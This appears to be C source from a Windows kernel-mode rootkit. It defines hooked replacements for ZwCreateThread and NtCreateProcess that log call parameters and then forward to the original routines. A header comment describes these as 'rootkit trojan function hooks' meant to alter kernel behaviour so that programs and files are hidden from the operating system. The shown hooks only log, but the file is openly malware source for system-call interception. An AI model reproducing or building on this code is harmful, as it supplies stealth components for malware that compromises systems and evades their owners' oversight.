
#include "rk_driver.h"
#include "rk_process.h"

/* process manager routines */

/* _______________________________________________________________________
 . rootkit trojan function hooks.  These are the meat and potatos kids.
 . Each of these functions is performing the duty of an original
 . kernel routine.  The rootkit must alter the behavior of these functions
 . to hide programs and files from the operating system.
 . _______________________________________________________________________ */
/* ________________________________________________
 . watch thread creation
 . ________________________________________________ */
NTSTATUS NewZwCreateThread(
	OUT PHANDLE phThread,
	IN ACCESS_MASK AccessMask,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN HANDLE hProcess,
	OUT PCLIENT_ID pClientId,
	IN PCONTEXT pContext,
	OUT PSTACKINFO pStackInfo,
	IN BOOLEAN bSuspended
)
{
	int rc;
	STACKINFO StackInfo;
	CHAR aProcessName[PROCNAMELEN];
		
	GetProcessName( aProcessName );		
	DbgPrint("rootkit: NewZwCreateThread() from %s\n", aProcessName);

	DumpObjectAttributes(ObjectAttributes);

	if(bSuspended) DbgPrint("create suspended\n");

	DumpContext(pContext);
	
	/* dump stack info */
	if(pStackInfo)
	{
		DbgPrint("StackInfo.TopOfStack=0x%X\n", pStackInfo->TopOfStack);
		DbgPrint("StackInfo.BottomOfStack=0x%X\n", pStackInfo->BottomOfStack);
		DbgPrint("StackInfo.OnePageBelowTopOfStack=0x%X\n", pStackInfo->OnePageBelowTopOfStack);
	}

	DbgPrint("parent process 0x%X\n", hProcess);



	rc = ((ZWCREATETHREAD)(OldZwCreateThread)) (
									phThread,
									AccessMask,
									ObjectAttributes,
									hProcess,
									pClientId,
									pContext,
									pStackInfo,
									bSuspended
									);
	if(phThread) DbgPrint("thread handle 0x%X\n", *phThread);
	DbgPrint("ZwCreateThread : rc = %x\n", rc);
    
	
	DumpContext(pContext);
	
	return rc;
}

/* _________________________________________________________
 . usually no object attributes - just a hSection pointer.
 . _________________________________________________________ */
NTSTATUS NewNtCreateProcess(
	OUT PHANDLE phProcess,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN HANDLE hParentProcess,
	IN BOOLEAN bInheritParentHandles,
	IN HANDLE hSection OPTIONAL,
	IN HANDLE hDebugPort OPTIONAL,
	IN HANDLE hExceptionPort OPTIONAL)
{
		int rc;
        char ParentDirectory[1024];
        PUNICODE_STRING Parent=NULL;
		CHAR aProcessName[PROCNAMELEN];
		
		GetProcessName( aProcessName );
		DbgPrint("rootkit: NewNtCreateProcess() from %s\n", aProcessName);

		DumpObjectAttributes(ObjectAttributes);

		if(hSection) DbgPrint("rootkit: launching NtCreateProcess w/ hSection 0x%X\n", hSection);
        
		rc=((NTCREATEPROCESS)(OldNtCreateProcess)) (
                        phProcess,
                        DesiredAccess,
                        ObjectAttributes,
                        hParentProcess,
                        bInheritParentHandles,
                        hSection,
                        hDebugPort,
                        hExceptionPort);
		if(phProcess) DbgPrint("rootkit: phProcess 0x%X\n", *phProcess);
        DbgPrint("rootkit: NtCreateProcess : rc = %x\n",  rc);
        return rc;
}


